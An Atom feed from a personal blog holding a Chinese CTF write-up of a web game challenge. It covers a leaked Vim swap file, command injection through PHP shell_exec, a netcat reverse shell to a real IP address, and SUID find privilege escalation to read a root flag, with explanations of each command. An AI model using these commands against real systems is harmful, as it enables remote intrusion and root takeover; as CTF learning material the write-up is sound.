@@ -1,0 +1,47 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>aihenai</title>
+  
+  
+  <link href="https://aihenai.github.io/atom.xml" rel="self"/>
+  
+  <link href="https://aihenai.github.io/"/>
+  <updated>2025-12-04T12:31:39.970Z</updated>
+  <id>https://aihenai.github.io/</id>
+  
+  <author>
+    <name>aihenai</name>
+    
+  </author>
+  
+  <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>HCTF 招新赛游戏题 Wp</title>
+    <link href="https://aihenai.github.io/2025/12/03/HCTF-Game-Wp/"/>
+    <id>https://aihenai.github.io/2025/12/03/HCTF-Game-Wp/</id>
+    <published>2025-12-03T11:56:14.000Z</published>
+    <updated>2025-12-04T12:31:39.970Z</updated>
+    
+    <content type="html"><![CDATA[<p>1、打开题目，游戏题先看源代码</p><p><img src="/2025/12/03/HCTF-Game-Wp/image-20251105200738403.png"></p><p>2、源代码中有game.js文件，进入查看，搜索score无果后，在最底部找到了.swp文件的提示，尝试.index.php.swp得到文件</p><p><img src="/2025/12/03/HCTF-Game-Wp/image-20251105202903850.png"></p><p>3、在文件中得到下一个地址&#x2F;Nr.php</p><p><img src="/2025/12/03/HCTF-Game-Wp/image-20251105202949656.png"></p><p>4、进入看到代码，分析代码后发现这里使用的是shell_exec函数，shell_exec函数需要主动输出，这里显然没有，而且题目提示真正的flag在root目录之下，我们还需要获取root权限才行，但这里又限制掉了find和一些常用的如cat、tac、nl等函数，所以我们选择反弹shell</p><p><img src="/2025/12/03/HCTF-Game-Wp/image-20251105203026439.png"></p><p><img src="/2025/12/03/HCTF-Game-Wp/image-20251105204045457.png"></p><p>5、我们用tabby连接云服务器，输入nc -lvp 2333对2333端口进行监听，然后传参cmd&#x3D;nc -e &#x2F;bin&#x2F;sh 101.200.30.203 2333</p><p><img src="/2025/12/03/HCTF-Game-Wp/image-20251105204715452.png"></p><p><img src="/2025/12/03/HCTF-Game-Wp/image-20251105204727148.png"></p><p>6、提权的方式在前面的提示中已经告诉我们了，需要使用SUID进行提权，于是我们对带相应权限的文件进行搜索</p><p><img src="/2025/12/03/HCTF-Game-Wp/image-20251105205156247.png"></p><p>7、我们选用find文件进行提权；使用find &#x2F;usr&#x2F;bin&#x2F;find -exec &#x2F;bin&#x2F;sh -p ;命令</p><p><img src="/2025/12/03/HCTF-Game-Wp/image-20251105205713620.png"></p><p>8、whoami检查权限为root之后，直接ls &#x2F;root，发现flag之后用tac &#x2F;root&#x2F;flag进行读取</p><p><img src="/2025/12/03/HCTF-Game-Wp/image-20251105210333650.png"></p><p><img src="/2025/12/03/HCTF-Game-Wp/image-20251105210344755.png"></p><p><img src="/2025/12/03/HCTF-Game-Wp/image-20251105210353495.png"></p><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><h2 id="1、find-usr-bin-find-exec-bin-sh-p-命令解释"><a href="#1、find-usr-bin-find-exec-bin-sh-p-命令解释" class="headerlink" title="1、find &#x2F;usr&#x2F;bin&#x2F;find -exec &#x2F;bin&#x2F;sh -p ;命令解释"></a>1、find &#x2F;usr&#x2F;bin&#x2F;find -exec &#x2F;bin&#x2F;sh -p ;命令解释</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">find /usr/bin/find：寻找find这个文件</span><br><span class="line"></span><br><span class="line">-exec：当find找到符合条件的文件时，执行指定的命令</span><br><span class="line"></span><br><span class="line">/bin/sh：承接高权限程序（如带SUID的find）的权限，生成高权限shell</span><br><span class="line"></span><br><span class="line">-p：继承保持这个权限</span><br></pre></td></tr></table></figure><h2 id="2、-swp"><a href="#2、-swp" class="headerlink" title="2、.swp"></a>2、.swp</h2><p>.swp文件是 Vim 编辑器生成的临时交换文件，用于在编辑过程中临时保存文件内容，防止意外中断导致未保存的修改丢失；常以.开头用于隐藏文件</p><h2 id="3、shell-exec函数"><a href="#3、shell-exec函数" class="headerlink" title="3、shell_exec函数"></a>3、shell_exec函数</h2><p>PHP 中用于执行系统命令并获取输出的内置函数，但是与system不同，它需要手动echo才有输出</p><h2 id="4、whoami"><a href="#4、whoami" class="headerlink" title="4、whoami"></a>4、whoami</h2><p>显示当前执行命令的用户身份</p><h2 id="5、SUID"><a href="#5、SUID" class="headerlink" title="5、SUID"></a>5、SUID</h2><p>允许普通用户执行某文件时，临时获得该文件所有者的权限，在提权操作很常见</p><h2 id="6、find-perm-u-s-type-f-2-dev-null命令解释"><a href="#6、find-perm-u-s-type-f-2-dev-null命令解释" class="headerlink" title="6、find -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null命令解释"></a>6、find -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null命令解释</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-perm：按照权限筛选文件</span><br><span class="line"></span><br><span class="line">-u=s：u代表文件所有者，s代表 SUID 权限，整体意思是 “必须包含所有者的 SUID 权限”</span><br><span class="line"></span><br><span class="line">-type：按照文件类型筛选文件</span><br><span class="line"></span><br><span class="line">f：代表file普通文件</span><br><span class="line"></span><br><span class="line">2&gt;/dev/null：2代表错误输出，/dev/null是一个文件黑洞，用于丢弃放入这里的的文件</span><br></pre></td></tr></table></figure><h2 id="7、nc命令"><a href="#7、nc命令" class="headerlink" title="7、nc命令"></a>7、nc命令</h2><p>格式：nc [选项] [目标IP] [端口]</p><p>选项：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-l：监听模式（作为服务器，等待连接）；</span><br><span class="line">-p：指定本地端口（配合 -l 使用）；</span><br><span class="line">-e：执行命令（连接建立后，将本地 Shell 绑定到连接，常用于反弹 Shell）；</span><br><span class="line">-n：不进行 DNS 解析（直接用 IP，加快速度）；</span><br><span class="line">-v：显示详细输出（调试用）；</span><br><span class="line">-z：扫描模式（不发送数据，仅检测端口是否开放）。</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;1、打开题目，游戏题先看源代码&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/2025/12/03/HCTF-Game-Wp/image-20251105200738403.png&quot;&gt;&lt;/p&gt;
+&lt;p&gt;2、源代码中有game.js文件，进入查看，搜索score无果后，在最底部找到了.s</summary>
+      
+    
+    
+    
+    <category term="CTF" scheme="https://aihenai.github.io/categories/CTF/"/>
+    
+    
+    <category term="web" scheme="https://aihenai.github.io/tags/web/"/>
+    
+    <category term="wp" scheme="https://aihenai.github.io/tags/wp/"/>
+    
+  </entry>
+  
+</feed>
